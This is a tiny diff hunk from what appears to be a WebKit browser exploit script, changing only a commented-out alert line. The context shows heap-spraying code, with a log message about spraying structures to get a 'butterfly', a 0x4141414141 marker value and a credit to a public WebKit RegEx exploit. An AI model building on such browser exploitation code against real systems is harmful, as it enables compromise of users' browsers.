@@ -708,7 +708,7 @@ b.process = (inputs, outputs, parameters)=>{
    foo({});
    foo({x:0x4141414141});
 }
-        //alert1("starting");
+        //alert1("starting")
         print1('[*] Spraying structures to get a butterfly (1/2)...');
         // copy paste from: 
         // https://github.com/LinusHenze/WebKit-RegEx-Exploit    
